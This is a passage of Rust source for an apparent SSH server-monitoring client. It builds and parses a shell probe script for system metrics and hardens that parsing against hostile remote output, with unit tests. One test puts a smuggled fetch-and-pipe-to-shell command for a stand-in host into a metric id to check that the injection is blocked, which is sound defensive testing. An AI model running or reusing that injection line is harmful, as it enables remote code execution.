# Disk usage on root: -k forces 1024-byte blocks so total/used are in KiB,
# which the parser already expects. Skipping -P: busybox 1.x's df doesn't
# always support it, and column ordering ($2 total, $3 used) is the same
# without it on every distro we've seen.
echo DISK $(df -k / 2>/dev/null | awk 'NR==2 {print $2, $3; exit}')
# Network totals across all real interfaces (skip loopback). Tolerates
# both `eth0:` and `  eth0:` formatting variants found in /proc/net/dev.
echo NET $(awk '
  BEGIN{r=0; t=0}
  NR>2 {
    line=$0
    sub(/^[ \t]+/, "", line)
    if (line ~ /^lo:/) next
    gsub(":", " ", line)
    n=split(line, f, /[ \t]+/)
    if (n >= 10) { r += f[2]; t += f[10] }
  }
  END {print r+0, t+0}
' /proc/net/dev 2>/dev/null)
"#;

const CUSTOM_BEGIN: &str = "__SUB_C_BEGIN__";
const CUSTOM_END: &str = "__SUB_C_END__";

/// Random per-poll token for the custom-metric markers, so output from the
/// monitored host can't fake a marker it hasn't seen.
fn probe_nonce() -> String {
    use rand::Rng;
    let mut bytes = [0u8; 8];
    rand::rng().fill_bytes(&mut bytes);
    hex::encode(bytes)
}

/// Sentinel pair around each custom command's stdout so the parser can
/// recover the per-metric slice. The markers carry the metric's INDEX and a
/// per-poll nonce, never its id: the id comes from the stored (possibly
/// synced) config, and splicing it into the script let a crafted id — one
/// the UI never shows — inject extra shell commands. Each marker is printed
/// on a line of its own, so a command whose output has no trailing newline
/// (`printf 42`) still closes its block.
fn build_probe_script(customs: &[CustomMetric], nonce: &str) -> String {
    let mut s = String::from(BUILTIN_PROBE);
    for (idx, cm) in customs.iter().enumerate() {
        // We isolate each custom command in its own subshell so a `cd` or
        // `set -e` inside one user command can't bleed into the next. The
        // command sits on lines of its own inside the parentheses, so one
        // ending in a `# comment` can't comment out the closing `)`.
        s.push_str(&format!(
            "\nprintf '\\n%s\\n' '{begin}{nonce}_{idx}'\n(\n{cmd}\n) 2>/dev/null\nprintf '\\n%s\\n' '{end}{nonce}_{idx}'\n",
            begin = CUSTOM_BEGIN,
            end = CUSTOM_END,
            cmd = cm.command.replace('\r', ""),
        ));
    }
    s
}

#[derive(Debug, Clone, Default)]
struct RawSnapshot {
    ts: u64,
    /// Sum of all CPU jiffies, and the idle portion (idle + iowait). We
    /// compute usage as `(busy_now-busy_prev) / (total_now-total_prev)`.
    cpu_total: u64,
    cpu_idle: u64,
    mem_total_kb: u64,
    mem_avail_kb: u64,
    swap_total_kb: u64,
    swap_free_kb: u64,
    load1: f64,
    disk_total_kb: u64,
    disk_used_kb: u64,
    net_rx_bytes: u64,
    net_tx_bytes: u64,
    /// Per-custom-metric raw stdout slice (trimmed). Indexed by custom id.
    custom_text: HashMap<String, String>,
    /// The custom metric whose output was cut off at the per-poll cap, if
    /// any — reported as too large instead of "no output".
    truncated_custom: Option<String>,
}

async fn poll_once(
    handle: &russh::client::Handle<MonitorHandler>,
    customs: &[CustomMetric],
    poll_timeout: Duration,
) -> Result<RawSnapshot, String> {
    let nonce = probe_nonce();
    let script = build_probe_script(customs, &nonce);
    let channel = handle
        .channel_open_session()
        .await
        .map_err(|e| format!("打开会话失败：{}", e))?;
    channel
        .exec(true, script.as_bytes())
        .await
        .map_err(|e| format!("exec: {}", e))?;
    let mut stream = channel.into_stream();
    let mut buf = Vec::with_capacity(4096);
    // The probe prints a few hundred bytes plus each custom metric's output.
    // Cap what one poll may return: a hostile or broken host that streams
    // without end would otherwise grow this buffer until the allocation fails
    // and the whole process (every session and tunnel) aborts. Hitting the
    // cap isn't a failed poll: stop reading, close the channel, and parse
    // what arrived — the built-in readings come first, and only the metric
    // that overflowed (plus any after it) misses this poll.
    const MAX_PROBE_OUTPUT: usize = 256 * 1024;
    let mut truncated = false;
    let read_fut = async {
        let mut tmp = [0u8; 2048];
        loop {
            match stream.read(&mut tmp).await {
                Ok(0) => break,
                Ok(n) => {
                    let room = MAX_PROBE_OUTPUT - buf.len();
                    if n > room {
                        buf.extend_from_slice(&tmp[..room]);
                        truncated = true;
                        break;
                    }
                    buf.extend_from_slice(&tmp[..n]);
                }
                Err(_) => break,
            }
        }
    };
    tokio::time::timeout(poll_timeout, read_fut)
        .await
        .map_err(|_| "probe script timed out".to_string())?;
    drop(stream);

    parse_probe(&String::from_utf8_lossy(&buf), &nonce, customs, truncated)
}

fn parse_probe(
    text: &str,
    nonce: &str,
    customs: &[CustomMetric],
    truncated: bool,
) -> Result<RawSnapshot, String> {
    let mut snap = RawSnapshot::default();
    snap.ts = now_ms();
    // Two-pass: first carve out the custom blocks (anything between
    // BEGIN<nonce>_<idx> and END<nonce>_<idx> belongs to custom metric
    // `idx`, not to the built-in tag stream). Custom output can contain
    // multi-line text or even our own tag names without confusing the
    // built-in parser.
    //
    // Custom output comes from the monitored host, so it must not be able to
    // pass for a built-in reading (e.g. close its block early, then print
    // `DISK 100 1` to hide a full disk). The built-in probe runs first, so
    // its lines all precede the first custom block: after that block opens,
    // anything outside a block is dropped. Blocks are only recognised with
    // this poll's nonce, in script order, once each.
    let begin = format!("{}{}_", CUSTOM_BEGIN, nonce);
    let end = format!("{}{}_", CUSTOM_END, nonce);
    let mut builtin_lines: Vec<&str> = Vec::new();
    let mut seen_custom = false;
    let mut next_idx: usize = 0;
    let mut open: Option<usize> = None;
    let mut current_buf = String::new();
    for line in text.lines() {
        let t = line.trim();
        if open.is_none() {
            if let Some(rest) = t.strip_prefix(begin.as_str()) {
                if next_idx < customs.len() && rest.parse::<usize>().ok() == Some(next_idx) {
                    open = Some(next_idx);
                    seen_custom = true;
                    current_buf.clear();
                    continue;
                }
            }
        } else if let Some(rest) = t.strip_prefix(end.as_str()) {
            if let Some(idx) = open.filter(|&i| rest.parse::<usize>().ok() == Some(i)) {
                snap.custom_text.insert(customs[idx].id.clone(), current_buf.trim().to_string());
                open = None;
                next_idx += 1;
                current_buf.clear();
                continue;
            }
        }
        if open.is_some() {
            if !current_buf.is_empty() {
                current_buf.push('\n');
            }
            current_buf.push_str(line); // keep original (with leading whitespace)
        } else if !seen_custom {
            builtin_lines.push(t);
        }
    }
    // If a BEGIN had no matching END (custom command crashed), drop the
    // partial buffer — better than reporting half a value. When the output
    // was cut at the cap, the block still open is the one that overflowed.
    if truncated {
        snap.truncated_custom = open.map(|idx| customs[idx].id.clone());
    }
    for line in builtin_lines {
        if line.is_empty() {
            continue;
        }
        let mut it = line.split_whitespace();
        let tag = match it.next() {
            Some(t) => t,
            None => continue,
        };
        let rest: Vec<&str> = it.collect();
        match tag {
            "CPU" if rest.len() >= 4 => {
                // user nice system idle iowait irq softirq steal
                // Saturating arithmetic: the values come straight off the
                // monitored host's /proc/stat, so a malicious/compromised
                // server could send u64::MAX-scale tokens whose sum overflows
                // and panics this poller task in a debug build (overflow-checks
                // on). Saturate instead of trusting the remote input.
                let nums: Vec<u64> = rest.iter().map(|s| s.parse().unwrap_or(0)).collect();
                let total: u64 = nums.iter().fold(0u64, |acc, &n| acc.saturating_add(n));
                let idle = nums.get(3).copied().unwrap_or(0)
                    .saturating_add(nums.get(4).copied().unwrap_or(0));
                snap.cpu_total = total;
                snap.cpu_idle = idle;
            }
            "MEM" if rest.len() >= 2 => {
                snap.mem_total_kb = rest[0].parse().unwrap_or(0);
                snap.mem_avail_kb = rest[1].parse().unwrap_or(0);
            }
            "SWAP" if rest.len() >= 2 => {
                snap.swap_total_kb = rest[0].parse().unwrap_or(0);
                snap.swap_free_kb = rest[1].parse().unwrap_or(0);
            }
            "LOAD" if !rest.is_empty() => {
                snap.load1 = rest[0].parse().unwrap_or(0.0);
            }
            "DISK" if rest.len() >= 2 => {
                snap.disk_total_kb = rest[0].parse().unwrap_or(0);
                snap.disk_used_kb = rest[1].parse().unwrap_or(0);
            }
            "NET" if rest.len() >= 2 => {
                snap.net_rx_bytes = rest[0].parse().unwrap_or(0);
                snap.net_tx_bytes = rest[1].parse().unwrap_or(0);
            }
            _ => { /* ignore unknown tags */ }
        }
    }
    Ok(snap)
}

fn compute_sample(
    node_id: i32,
    now: &RawSnapshot,
    prev: &Option<RawSnapshot>,
    enabled: &[String],
    customs: &[CustomMetric],
) -> Sample {
    let mut values: HashMap<String, f64> = HashMap::new();
    let mut errors: HashMap<String, String> = HashMap::new();
    let mut texts: HashMap<String, String> = HashMap::new();
    let want = |k: &str| enabled.iter().any(|s| s == k);

    // CPU% — diff-based; needs prev. First sample yields no value (so the
    // sparkline is correctly empty rather than fake-zero).
    if want("cpu") {
        if let Some(p) = prev {
            let dt = now.cpu_total.saturating_sub(p.cpu_total);
            let di = now.cpu_idle.saturating_sub(p.cpu_idle);
            if dt > 0 {
                let busy = dt.saturating_sub(di) as f64;
                values.insert("cpu".into(), (busy / dt as f64) * 100.0);
            }
        }
    }
    if want("mem") {
        if now.mem_total_kb > 0 {
            let used = now.mem_total_kb.saturating_sub(now.mem_avail_kb);
            values.insert(
                "mem".into(),
                (used as f64 / now.mem_total_kb as f64) * 100.0,
            );
        } else {
            errors.insert("mem".into(), "memtotal=0".into());
        }
    }
    if want("swap") {
        if now.swap_total_kb > 0 {
            let used = now.swap_total_kb.saturating_sub(now.swap_free_kb);
            values.insert(
                "swap".into(),
                (used as f64 / now.swap_total_kb as f64) * 100.0,
            );
        } else {
            // Hosts without swap report 0/0 — that's fine, surface as 0%.
            values.insert("swap".into(), 0.0);
        }
    }
    if want("disk") {
        if now.disk_total_kb > 0 {
            values.insert(
                "disk".into(),
                (now.disk_used_kb as f64 / now.disk_total_kb as f64) * 100.0,
            );
        }
    }
    if want("load") {
        values.insert("load".into(), now.load1);
    }
    if want("net") {
        if let Some(p) = prev {
            let dt_ms = now.ts.saturating_sub(p.ts);
            if dt_ms > 0 {
                let secs = dt_ms as f64 / 1000.0;
                let dr = now.net_rx_bytes.saturating_sub(p.net_rx_bytes) as f64 / secs;
                let dt = now.net_tx_bytes.saturating_sub(p.net_tx_bytes) as f64 / secs;
                values.insert("net_in".into(), dr);
                values.insert("net_out".into(), dt);
            }
        }
    }
    // Custom metrics: pull each one's captured stdout and apply its parse
    // mode. Numeric outputs land in `values` (so the UI ring buffer picks
    // them up for sparklines); text outputs land in `texts`.
    for cm in customs {
        let raw = match now.custom_text.get(&cm.id) {
            Some(s) => s.trim().to_string(),
            None => {
                let why = if now.truncated_custom.as_deref() == Some(cm.id.as_str()) {
                    "output larger than 256 KiB"
                } else {
                    "no output"
                };
                errors.insert(cm.id.clone(), why.into());
                continue;
            }
        };
        match cm.parse.as_str() {
            "number" => match extract_number(&raw) {
                Some(v) => { values.insert(cm.id.clone(), v); }
                None => { errors.insert(cm.id.clone(), "no numeric token in output".into()); }
            },
            "regex" => {
                let pattern = cm.regex.as_deref().unwrap_or("");
                match apply_regex_number(pattern, &raw) {
                    Ok(v) => { values.insert(cm.id.clone(), v); }
                    Err(e) => { errors.insert(cm.id.clone(), e); }
                }
            }
            // "text" or anything else → treat as text
            _ => {
                texts.insert(cm.id.clone(), raw);
            }
        }
    }

    Sample {
        node_id,
        ts: now.ts,
        values,
        errors,
        texts,
    }
}

/// Pull the first numeric token (possibly with sign and decimal) out of any
/// stdout. Tolerant: works for "42", "42.5", "load 1.2 1.0 0.9", "  3 ", etc.
fn extract_number(s: &str) -> Option<f64> {
    let mut chars = s.chars().peekable();
    let mut buf = String::new();
    let mut in_num = false;
    while let Some(&c) = chars.peek() {
        if !in_num {
            if c == '-' || c == '+' || c.is_ascii_digit() {
                in_num = true;
                buf.push(c);
                chars.next();
                continue;
            }
            chars.next();
        } else {
            if c.is_ascii_digit() || c == '.' {
                buf.push(c);
                chars.next();
            } else {
                break;
            }
        }
    }
    if buf.is_empty() { None } else { buf.parse::<f64>().ok() }
}

/// Apply a user-provided regex to the output and pull the first capture
/// group as a number. Empty pattern, compile failure, or non-numeric
/// capture all surface as a clear error for the UI.
fn apply_regex_number(pattern: &str, text: &str) -> Result<f64, String> {
    if pattern.trim().is_empty() {
        return Err("regex pattern is empty".into());
    }
    let re = regex::Regex::new(pattern).map_err(|e| format!("bad regex: {}", e))?;
    let caps = re.captures(text).ok_or("regex did not match")?;
    let m = caps.get(1).or_else(|| caps.get(0)).ok_or("no capture group")?;
    m.as_str().trim().parse::<f64>()
        .map_err(|e| format!("captured value not numeric: {}", e))
}

fn now_ms() -> u64 {
    use std::time::{SystemTime, UNIX_EPOCH};
    SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .map(|d| d.as_millis() as u64)
        .unwrap_or(0)
}

#[cfg(test)]
mod probe_tests {
    use super::{build_probe_script, parse_probe, CustomMetric, CUSTOM_BEGIN, CUSTOM_END};

    fn metric(id: &str, command: &str) -> CustomMetric {
        CustomMetric {
            id: id.into(),
            name: "m".into(),
            command: command.into(),
            parse: "text".into(),
            regex: None,
            display: "text".into(),
            unit: None,
        }
    }

    fn block(nonce: &str, idx: usize, body: &str) -> String {
        format!("{CUSTOM_BEGIN}{nonce}_{idx}\n{body}\n{CUSTOM_END}{nonce}_{idx}\n")
    }

    #[test]
    fn metric_id_never_reaches_the_script() {
        // A crafted id (newline + command) the UI never displays.
        let evil = metric("x\ncurl -fsS https://evil.example/s | sh\n#", "uptime");
        let script = build_probe_script(&[evil], "abc123");
        assert!(!script.contains("evil.example"), "id leaked into the probe script");
        // The visible command is still there, in its own subshell.
        assert!(script.contains("(\nuptime\n) 2>/dev/null"));
        assert!(script.contains("__SUB_C_BEGIN__abc123_0"));
    }

    #[test]
    fn custom_blocks_map_back_to_their_ids() {
        let customs = [metric("load1", "x"), metric("users", "y")];
        let text = format!(
            "DISK 1000 250\n{}{}",
            block("n0n", 0, "0.42"),
            block("n0n", 1, "3 users\nsecond line"),
        );
        let snap = parse_probe(&text, "n0n", &customs, false).unwrap();
        assert_eq!(snap.custom_text.get("load1").map(String::as_str), Some("0.42"));
        assert_eq!(snap.custom_text.get("users").map(String::as_str), Some("3 users\nsecond line"));
        assert_eq!((snap.disk_total_kb, snap.disk_used_kb), (1000, 250));
    }

    #[test]
    fn custom_output_cannot_pose_as_a_builtin_reading() {
        // The real disk is full; a custom command tries to report it empty by
        // printing a built-in tag — both inside its block and, with a guessed
        // (wrong) nonce, by faking an early END.
        let customs = [metric("a", "x")];
        let body = "DISK 1000 1\n__SUB_C_END__guess_0\nDISK 1000 1";
        let text = format!("DISK 1000 999\n{}", block("real", 0, body));
        let snap = parse_probe(&text, "real", &customs, false).unwrap();
        assert_eq!(snap.disk_used_kb, 999, "custom output overrode a built-in reading");
        // Everything the command printed stays in its own slice.
        assert!(snap.custom_text["a"].contains("DISK 1000 1"));
    }

    #[test]
    fn lines_outside_blocks_after_customs_start_are_ignored() {
        // Even a correctly-nonced early END can't smuggle built-in lines out:
        // anything outside a block after the first custom block is dropped.
        let customs = [metric("a", "x"), metric("b", "y")];
        let text = "DISK 1000 999\n\
                    __SUB_C_BEGIN__k_0\nv\n__SUB_C_END__k_0\n\
                    DISK 1000 1\n\
                    __SUB_C_BEGIN__k_1\nw\n__SUB_C_END__k_1\n";
        let snap = parse_probe(text, "k", &customs, false).unwrap();
        assert_eq!(snap.disk_used_kb, 999);
        assert_eq!(snap.custom_text["b"], "w");
    }

    #[test]
    fn blocks_are_taken_in_order_once() {
        // A block for an unexpected index (out of order / repeated) is not
        // treated as a marker, so it can't overwrite another metric's value.
        let customs = [metric("a", "x"), metric("b", "y")];
        let text = "__SUB_C_BEGIN__k_1\nfake-b\n__SUB_C_END__k_1\n\
                    __SUB_C_BEGIN__k_0\nreal-a\n__SUB_C_END__k_0\n\
                    __SUB_C_BEGIN__k_1\nreal-b\n__SUB_C_END__k_1\n";
        let snap = parse_probe(text, "k", &customs, false).unwrap();
        assert_eq!(snap.custom_text["a"], "real-a");
        assert_eq!(snap.custom_text["b"], "real-b");
    }

    #[test]
    fn marker_without_trailing_newline_still_closes() {
        // `printf 42` leaves no newline; the script prints each END marker
        // after a newline of its own, so the block still closes.
        let script = build_probe_script(&[metric("a", "printf 42")], "z");
        assert!(script.contains("printf '\\n%s\\n' '__SUB_C_END__z_0'"));
        let text = "__SUB_C_BEGIN__z_0\n42\n__SUB_C_END__z_0\n";
        let snap = parse_probe(text, "z", &[metric("a", "printf 42")], false).unwrap();
        assert_eq!(snap.custom_text["a"], "42");
    }

    #[test]
    fn output_cut_at_the_cap_blames_only_the_open_block() {
        // The poll stopped reading inside metric b's block: built-ins and the
        // finished block still count, and only b is reported as too large.
        let customs = [metric("a", "echo 1"), metric("b", "yes")];
        let text = "LOAD 0.5\n\
                    __SUB_C_BEGIN__t_0\n1\n__SUB_C_END__t_0\n\
                    __SUB_C_BEGIN__t_1\ny\ny\ny";
        let snap = parse_probe(text, "t", &customs, true).unwrap();
        assert_eq!(snap.load1, 0.5);
        assert_eq!(snap.custom_text["a"], "1");
        assert!(!snap.custom_text.contains_key("b"));
        assert_eq!(snap.truncated_custom.as_deref(), Some("b"));
        // A complete poll blames nothing.
        let snap = parse_probe(text, "t", &customs, false).unwrap();
        assert_eq!(snap.truncated_custom, None);
    }

    #[test]
    fn a_trailing_comment_cannot_swallow_the_subshell() {
        // `cmd # note` on the same line as `)` would comment it out and break
        // every metric after it; the command gets lines of its own.
        let script = build_probe_script(&[metric("a", "df -h / | tail -1 # root")], "c");
        assert!(script.contains("(\ndf -h / | tail -1 # root\n) 2>/dev/null"));
    }
}

#[cfg(test)]
mod tests {
    use super::monitor_client_config;

    /// S4 / S1: the monitor must negotiate exactly like the interactive
    /// session (same algorithm lists + DH-GEX bounds) and must not drop a
    /// quiet connection on its own.
    #[test]
    fn monitor_config_matches_the_interactive_session() {
        let monitor = monitor_client_config();
        let session = crate::build_ssh_client_config();
        assert_eq!(format!("{:?}", monitor.preferred), format!("{:?}", session.preferred));
        assert_eq!(
            (monitor.gex.min_group_size(), monitor.gex.preferred_group_size(), monitor.gex.max_group_size()),
            (session.gex.min_group_size(), session.gex.preferred_group_size(), session.gex.max_group_size()),
        );
        assert_eq!(monitor.keepalive_max, 0);
    }
}
